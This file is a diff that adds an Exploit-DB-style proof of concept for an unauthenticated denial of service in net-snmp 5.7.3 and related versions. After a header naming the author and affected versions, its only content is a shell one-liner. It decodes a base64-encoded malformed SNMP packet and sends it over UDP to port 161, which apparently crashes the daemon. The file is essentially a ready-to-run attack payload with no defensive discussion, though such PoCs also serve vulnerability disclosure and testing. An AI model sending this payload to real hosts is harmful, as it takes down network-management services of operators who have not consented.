@@ -1,0 +1,9 @@
+# Exploit Title: net-snmp 5.7.3 - Unauthenticated Denial of Service (PoC)
+# Date: 2018-10-08
+# Exploit Author: Magnus Klaaborg Stubman 
+# Website: https://dumpco.re/blog/net-snmp-5.7.3-remote-dos
+# Vendor Homepage: http://www.net-snmp.org/
+# Software Link: https://sourceforge.net/projects/net-snmp/files/net-snmp/5.7.3/
+# Version: 5.7.3, 5.5.2.1, 5.6.2.1, others not tested
+
+echo -n "MIG1AgEDMBECBACeXRsCAwD/4wQBBQIBAwQvMC0EDYAAH4iAWdxIYUWiYyICAQgCAgq5BAVwaXBwbwQMBVsKohj9MlusDerWBAAwbAQFgAAAAAYEAKFZAgQsGA29AgEAAgEAMEswDQEEAWFFg2MiBAChWQIELBgNvQIBAAIBADBLMA0GCSsGAQIBAgI1LjI1NS4wMCEGEisGNS4yNTUuMAEEAYF9CDMKAgEHCobetzgECzE3Mi4zMS4xOS4y" | base64 -d > /dev/udp/127.0.0.1/161
